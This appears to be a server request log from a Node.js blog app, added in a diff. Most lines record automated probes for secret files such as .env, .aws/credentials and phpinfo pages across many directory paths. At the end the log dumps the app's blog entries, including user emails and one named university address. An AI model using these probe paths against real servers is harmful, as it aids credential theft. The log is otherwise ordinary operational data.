+[0mGET /linux/.env [32m200 [0m0.737 ms - 6377[0m
+[0mGET /local/.env [32m200 [0m0.711 ms - 6377[0m
+[0mGET /log/.env [32m200 [0m0.759 ms - 6377[0m
+[0mGET /logging/.env [32m200 [0m0.759 ms - 6377[0m
+[0mGET /login/.env [32m200 [0m0.735 ms - 6377[0m
+[0mGET /mail/.env [32m200 [0m0.712 ms - 6377[0m
+[0mGET /mailinabox/.env [32m200 [0m0.729 ms - 6377[0m
+[0mGET /mailman/.env [32m200 [0m0.869 ms - 6377[0m
+[0mGET /main_user/.env [32m200 [0m0.759 ms - 6377[0m
+[0mGET /main/.env [32m200 [0m0.686 ms - 6377[0m
+[0mGET /manual/.env [32m200 [0m0.869 ms - 6377[0m
+[0mGET /master/.env [32m200 [0m0.697 ms - 6377[0m
+[0mGET /media/.env [32m200 [0m0.740 ms - 6377[0m
+[0mGET /memcached/.env [32m200 [0m1.315 ms - 6377[0m
+[0mGET /micro-app-react/.env [32m200 [0m0.859 ms - 6377[0m
+[0mGET /minified/.env [32m200 [0m0.740 ms - 6377[0m
+[0mGET /misc/.env [32m200 [0m0.729 ms - 6377[0m
+[0mGET /Modix/ClientApp/.env [32m200 [0m0.700 ms - 6377[0m
+[0mGET /monerod/.env [32m200 [0m0.712 ms - 6377[0m
+[0mGET /moodledata/.env [32m200 [0m0.733 ms - 6377[0m
+[0mGET /msks/.env [32m200 [0m0.770 ms - 6377[0m
+[0mGET /munki_repo/.env [32m200 [0m0.825 ms - 6377[0m
+[0mGET /music/.env [32m200 [0m1.441 ms - 6377[0m
+[0mGET /name/.env [32m200 [0m0.769 ms - 6377[0m
+[0mGET /new-js/.env [32m200 [0m0.735 ms - 6377[0m
+[0mGET /news-app/.env [32m200 [0m0.761 ms - 6377[0m
+[0mGET /nginx-server/.env [32m200 [0m0.737 ms - 6377[0m
+[0mGET /nginx/.env [32m200 [0m0.764 ms - 6377[0m
+[0mGET /niffler-frontend/.env [32m200 [0m0.868 ms - 6377[0m
+[0mGET /node_modules/.env [32m200 [0m0.703 ms - 6377[0m
+[0mGET /noVNC/.env [32m200 [0m0.703 ms - 6377[0m
+[0mGET /oldsanta/.env [32m200 [0m0.721 ms - 6377[0m
+[0mGET /ops/vagrant/.env [32m200 [0m0.709 ms - 6377[0m
+[0mGET /option/.env [32m200 [0m0.743 ms - 6377[0m
+[0mGET /orientdb-client/.env [32m200 [0m0.694 ms - 6377[0m
+[0mGET /outputs/.env [32m200 [0m0.774 ms - 6377[0m
+[0mGET /owncloud/.env [32m200 [0m0.714 ms - 6377[0m
+[0mGET /packed/.env [32m200 [0m0.726 ms - 6377[0m
+[0mGET /page-editor/.env [32m200 [0m0.745 ms - 6377[0m
+[0mGET /parity/.env [32m200 [0m1.566 ms - 6377[0m
+[0mGET /Passportjs/.env [32m200 [0m0.696 ms - 6377[0m
+[0mGET /patchwork/.env [32m200 [0m0.813 ms - 6377[0m
+[0mGET /path/.env [32m200 [0m0.735 ms - 6377[0m
+[0mGET /pfbe/.env [32m200 [0m0.889 ms - 6377[0m
+[0mGET /pictures/.env [32m200 [0m0.834 ms - 6377[0m
+[0mGET /playground/.env [32m200 [0m0.732 ms - 6377[0m
+[0mGET /plugin_static/.env [32m200 [0m0.828 ms - 6377[0m
+[0mGET /postfixadmin/.env [32m200 [0m1.596 ms - 6377[0m
+[0mGET /price_hawk_client/.env [32m200 [0m0.804 ms - 6377[0m
+[0mGET /prisma/.env [32m200 [0m0.803 ms - 6377[0m
+[0mGET /private/.env [32m200 [0m0.733 ms - 6377[0m
+[0mGET /processor/.env [32m200 [0m0.723 ms - 6377[0m
+[0mGET /prod/.env [32m200 [0m0.713 ms - 6377[0m
+[0mGET /projbackend/.env [32m200 [0m0.710 ms - 6377[0m
+[0mGET /project_root/.env [32m200 [0m0.719 ms - 6377[0m
+[0mGET /psnlink/.env [32m200 [0m0.715 ms - 6377[0m
+[0mGET /pub/.env [32m200 [0m1.940 ms - 6377[0m
+[0mGET /public/.env [32m200 [0m0.789 ms - 6377[0m
+[0mGET /question2/.env [32m200 [0m0.749 ms - 6377[0m
+[0mGET /qv-frontend/.env [32m200 [0m0.700 ms - 6377[0m
+[0mGET /rasax/.env [32m200 [0m0.749 ms - 6377[0m
+[0mGET /react_todo/.env [32m200 [0m0.875 ms - 6377[0m
+[0mGET /redmine/.env [32m200 [0m0.704 ms - 6377[0m
+[0mGET /repo/.env [32m200 [0m0.919 ms - 6377[0m
+[0mGET /repos/.env [32m200 [0m1.656 ms - 6377[0m
+[0mGET /repository/.env [32m200 [0m0.720 ms - 6377[0m
+[0mGET /resources/.env [32m200 [0m0.699 ms - 6377[0m
+[0mGET /resourcesync/.env [32m200 [0m0.733 ms - 6377[0m
+[0mGET /rest/.env [32m200 [0m0.735 ms - 6377[0m
+[0mGET /restapi/.env [32m200 [0m0.710 ms - 6377[0m
+[0mGET /results/.env [32m200 [0m0.719 ms - 6377[0m
+[0mGET /robots/.env [32m200 [0m0.690 ms - 6377[0m
+[0mGET /root/.env [32m200 [0m1.616 ms - 6377[0m
+[0mGET /routes/.env [32m200 [0m0.771 ms - 6377[0m
+[0mGET /run/.env [32m200 [0m0.692 ms - 6377[0m
+[0mGET /saas/.env [32m200 [0m0.720 ms - 6377[0m
+[0mGET /script/.env [32m200 [0m0.806 ms - 6377[0m
+[0mGET /scripts/.env [32m200 [0m0.705 ms - 6377[0m
+[0mGET /selfish-darling-backend/.env [32m200 [0m0.718 ms - 6377[0m
+[0mGET /Serve_time_server/.env [32m200 [0m0.809 ms - 6377[0m
+[0mGET /serve-browserbench/.env [32m200 [0m0.739 ms - 6377[0m
+[0mGET /Server_with_db/.env [32m200 [0m1.538 ms - 6377[0m
+[0mGET /server/.env [32m200 [0m0.846 ms - 6377[0m
+[0mGET /sessions/.env [32m200 [0m0.725 ms - 6377[0m
+[0mGET /shared/.env [32m200 [0m0.722 ms - 6377[0m
+[0mGET /shibboleth/.env [32m200 [0m0.899 ms - 6377[0m
+[0mGET /shop/.env [32m200 [0m1.047 ms - 6377[0m
+[0mGET /Simple_server/.env [32m200 [0m0.785 ms - 6377[0m
+[0mGET /site-library/.env [32m200 [0m0.707 ms - 6377[0m
+[0mGET /site/.env [32m200 [0m1.588 ms - 6377[0m
+[0mGET /sitemaps/.env [32m200 [0m0.710 ms - 6377[0m
+[0mGET /sites/.env [32m200 [0m0.696 ms - 6377[0m
+[0mGET /sitestatic/.env [32m200 [0m0.809 ms - 6377[0m
+[0mGET /Socketio/.env [32m200 [0m0.811 ms - 6377[0m
+[0mGET /sources/.env [32m200 [0m0.707 ms - 6377[0m
+[0mGET /spearmint/.env [32m200 [0m0.873 ms - 6377[0m
+[0mGET /SpotiApps/.env [32m200 [0m0.734 ms - 6377[0m
+[0mGET /src/.env [32m200 [0m0.951 ms - 6377[0m
+[0mGET /stackato-pkg/.env [32m200 [0m0.796 ms - 6377[0m
+[0mGET /static_prod/.env [32m200 [0m0.701 ms - 6377[0m
+[0mGET /static_root/.env [32m200 [0m0.843 ms - 6377[0m
+[0mGET /static_user/.env [32m200 [0m0.697 ms - 6377[0m
+[0mGET /static-collected/.env [32m200 [0m0.718 ms - 6377[0m
+[0mGET /static-html/.env [32m200 [0m0.738 ms - 6377[0m
+[0mGET /static-root/.env [32m200 [0m1.407 ms - 6377[0m
+[0mGET /static/.env [32m200 [0m0.708 ms - 6377[0m
+[0mGET /staticfiles/.env [32m200 [0m0.872 ms - 6377[0m
+[0mGET /stats/.env [32m200 [0m0.817 ms - 6377[0m
+[0mGET /storage/.env [32m200 [0m0.764 ms - 6377[0m
+[0mGET /style/.env [32m200 [0m0.730 ms - 6377[0m
+[0mGET /styles/.env [32m200 [0m0.720 ms - 6377[0m
+[0mGET /stylesheets/.env [32m200 [0m0.724 ms - 6377[0m
+[0mGET /symfony/.env [32m200 [0m0.730 ms - 6377[0m
+[0mGET /system-config/.env [32m200 [0m0.716 ms - 6377[0m
+[0mGET /system/.env [32m200 [0m0.824 ms - 6377[0m
+[0mGET /target/.env [32m200 [0m0.705 ms - 6377[0m
+[0mGET /temanr9/.env [32m200 [0m0.709 ms - 6377[0m
+[0mGET /temanr10/.env [32m200 [0m0.760 ms - 6377[0m
+[0mGET /temp/.env [32m200 [0m0.767 ms - 6377[0m
+[0mGET /template/.env [32m200 [0m0.768 ms - 6377[0m
+[0mGET /templates/.env [32m200 [0m0.736 ms - 6377[0m
+[0mGET /test-network/.env [32m200 [0m0.690 ms - 6377[0m
+[0mGET /test/.env [32m200 [0m0.787 ms - 6377[0m
+[0mGET /testfiles/.env [32m200 [0m0.765 ms - 6377[0m
+[0mGET /tests/.env [32m200 [0m0.719 ms - 6377[0m
+[0mGET /testwork_json/.env [32m200 [0m0.696 ms - 6377[0m
+[0mGET /theme_static/.env [32m200 [0m0.736 ms - 6377[0m
+[0mGET /theme/.env [32m200 [0m0.706 ms - 6377[0m
+[0mGET /thumb/.env [32m200 [0m0.704 ms - 6377[0m
+[0mGET /thumbs/.env [32m200 [0m0.824 ms - 6377[0m
+[0mGET /tiedostot/.env [32m200 [0m1.496 ms - 6377[0m
+[0mGET /tmp/.env [32m200 [0m0.714 ms - 6377[0m
+[0mGET /tools/.env [32m200 [0m0.887 ms - 6377[0m
+[0mGET /Travel_form/.env [32m200 [0m0.744 ms - 6377[0m
+[0mGET /ts/prime/.env [32m200 [0m0.681 ms - 6377[0m
+[0mGET /ubuntu/.env [32m200 [0m0.694 ms - 6377[0m
+[0mGET /ui/.env [32m200 [0m0.759 ms - 6377[0m
+[0mGET /unixtime/.env [32m200 [0m0.706 ms - 6377[0m
+[0mGET /upfiles/.env [32m200 [0m0.690 ms - 6377[0m
+[0mGET /upload/.env [32m200 [0m0.703 ms - 6377[0m
+[0mGET /uploads/.env [32m200 [0m0.694 ms - 6377[0m
+[0mGET /urlmem-app/.env [32m200 [0m0.834 ms - 6377[0m
+[0mGET /User_info/.env [32m200 [0m0.725 ms - 6377[0m
+[0mGET /var/backup/.env [32m200 [0m0.926 ms - 6377[0m
+[0mGET /vendor/.env [32m200 [0m0.889 ms - 6377[0m
+[0mGET /videos/.env [32m200 [0m0.701 ms - 6377[0m
+[0mGET /vm-docker-compose/.env [32m200 [0m0.715 ms - 6377[0m
+[0mGET /vod_installer/.env [32m200 [0m1.521 ms - 6377[0m
+[0mGET /web-dist/.env [32m200 [0m0.753 ms - 6377[0m
+[0mGET /web/.env [32m200 [0m0.751 ms - 6377[0m
+[0mGET /webroot_path/.env [32m200 [0m0.765 ms - 6377[0m
+[0mGET /websocket/.env [32m200 [0m0.714 ms - 6377[0m
+[0mGET /webstatic/.env [32m200 [0m0.773 ms - 6377[0m
+[0mGET /webui/.env [32m200 [0m0.703 ms - 6377[0m
+[0mGET /well-known/.env [32m200 [0m0.704 ms - 6377[0m
+[0mGET /.env.prod [32m200 [0m1.847 ms - 6377[0m
+[0mGET /github-connect/.env [32m200 [0m0.723 ms - 6377[0m
+[0mGET /legal/.env [32m200 [0m0.726 ms - 6377[0m
+[0mPOST / [32m200 [0m0.889 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.730 ms - 6377[0m
+[0mPOST / [32m200 [0m0.707 ms - 6377[0m
+[0mGET /hudson [32m200 [0m1.770 ms - 6377[0m
+[0mGET /druid/index.html [32m200 [0m0.977 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.702 ms - 6377[0m
+[0mPOST / [32m200 [0m6.390 ms - 6377[0m
+[0mGET /manager/text/list [32m200 [0m1.235 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.781 ms - 6377[0m
+[0mPOST / [32m200 [0m15.356 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.706 ms - 6377[0m
+[0mPOST / [32m200 [0m0.759 ms - 6377[0m
+[0mGET / [32m200 [0m0.717 ms - 6377[0m
+[0mGET / [32m200 [0m0.739 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.766 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.758 ms - 6377[0m
+[0mPOST / [32m200 [0m0.840 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.766 ms - 6377[0m
+[0mPOST / [32m200 [0m0.868 ms - 6377[0m
+[0mGET / [32m200 [0m0.689 ms - 6377[0m
+[0mGET /favicon.ico [32m200 [0m0.735 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.103 ms - 6377[0m
+[0mPOST / [32m200 [0m0.729 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.730 ms - 6377[0m
+[0mPOST / [32m200 [0m37.911 ms - 6377[0m
+[0mGET / [32m200 [0m0.726 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.397 ms - 6377[0m
+[0mPOST / [32m200 [0m0.759 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.832 ms - 6377[0m
+[0mPOST / [32m200 [0m0.724 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.823 ms - 6377[0m
+[0mPOST / [32m200 [0m148.678 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.752 ms - 6377[0m
+[0mPOST / [32m200 [0m0.696 ms - 6377[0m
+[0mGET /.env [32m200 [0m1.149 ms - 6377[0m
+[0mPOST / [32m200 [0m0.713 ms - 6377[0m
+[0mGET / [32m200 [0m0.635 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.742 ms - 6377[0m
+[0mPOST / [32m200 [0m0.718 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.886 ms - 6377[0m
+[0mPOST / [32m200 [0m107.819 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.739 ms - 6377[0m
+[0mPOST /.env [32m200 [0m0.763 ms - 6377[0m
+[0mGET /.aws/credentials [32m200 [0m0.790 ms - 6377[0m
+[0mPOST /.aws/credentials [32m200 [0m62.274 ms - 6377[0m
+[0mGET /.aws/config [32m200 [0m0.774 ms - 6377[0m
+[0mPOST /.aws/config [32m200 [0m60.322 ms - 6377[0m
+[0mGET /aws/credentials [32m200 [0m0.761 ms - 6377[0m
+[0mPOST /aws/credentials [32m200 [0m0.742 ms - 6377[0m
+[0mGET /test.php [32m200 [0m0.766 ms - 6377[0m
+[0mPOST /test.php [32m200 [0m0.902 ms - 6377[0m
+[0mGET /phpinfo [32m200 [0m0.746 ms - 6377[0m
+[0mPOST /phpinfo [32m200 [0m10.959 ms - 6377[0m
+[0mGET /_profiler/phpinfo [32m200 [0m1.466 ms - 6377[0m
+[0mPOST /_profiler/phpinfo [32m200 [0m6.096 ms - 6377[0m
+[0mGET /phpinfo.php [32m200 [0m0.799 ms - 6377[0m
+[0mPOST /phpinfo.php [32m200 [0m3.263 ms - 6377[0m
+[0mGET /info.php [32m200 [0m0.870 ms - 6377[0m
+[0mPOST /info.php [32m200 [0m34.914 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.718 ms - 6377[0m
+[0mPOST / [32m200 [0m0.721 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.828 ms - 6377[0m
+[0mPOST / [32m200 [0m62.466 ms - 6377[0m
+[0mGET /.env [32m200 [0m0.767 ms - 6377[0m
+[0mPOST / [32m200 [0m0.782 ms - 6377[0m
+[0mGET / [32m200 [0m0.732 ms - 6377[0m
+[0mGET /stylesheets/style.css [32m200 [0m1.771 ms - 111[0m
+[0mGET /css/fontawesome-all.css [32m200 [0m2.034 ms - 6377[0m
+[0mGET /bloggerApp.js [32m200 [0m1.238 ms - 11732[0m
+[0mGET /css/bootstrap.min.css [32m200 [0m1.923 ms - 232948[0m
+[0mGET /nav/navigation.html [32m200 [0m1.297 ms - 728[0m
+[0mGET /favicon.ico [32m200 [0m1.260 ms - 6377[0m
+Getting blogs list
+[0mGET /favicon.ico [36m304 [0m0.968 ms - -[0m
+[
+  {
+    _id: new ObjectId('65f726d439c584828c3373b4'),
+    blogTitle: '2nd Blog!',
+    blogText: 'I AM A BLOGGER! yep',
+    createdOn: 2024-03-17T17:22:28.114Z,
+    __v: 0
+  },
+  {
+    _id: new ObjectId('65f735572e5f288b63158769'),
+    blogTitle: '3rd blog!',
+    blogText: 'Blogs. Mhmm blogs!',
+    createdOn: 2024-03-17T18:24:23.902Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159d1a18ba1ee2a0ec279d'),
+    blogTitle: 'test',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:55:06.327Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'stew@mail.com', name: 'stew' },
+    _id: new ObjectId('66159db218ba1ee2a0ec27a4'),
+    blogTitle: 'test 2',
+    blogText: 'testing',
+    createdOn: 2024-04-09T19:57:38.040Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'susan@mail.com', name: 'susan' },
+    _id: new ObjectId('6615a0341a0a689c7079d508'),
+    blogTitle: "I'm Susan",
+    blogText: 'Yup',
+    createdOn: 2024-04-09T20:08:20.087Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'dave@mail.com', name: 'dave' },
+    _id: new ObjectId('6615ebf575485b75f7a30ba1'),
+    blogTitle: 'Dave is the Man',
+    blogText: "Hi im Dave yo. I'm the man.",
+    createdOn: 2024-04-10T01:31:33.770Z,
+    __v: 0
+  },
+  {
+    createdBy: { userEmail: 'trogers@millersville.edu', name: 'Thomas J Rogers' },
+    _id: new ObjectId('66160d7bef57f83a3cd1bee1'),
+    blogTitle: 'Prof Test!',
+    blogText: 'Test!',
+    createdOn: 2024-04-10T03:54:35.410Z,
+    __v: 0
+  }
+]
+[0mGET /api/blogs [32m200 [0m61.036 ms - 1204[0m
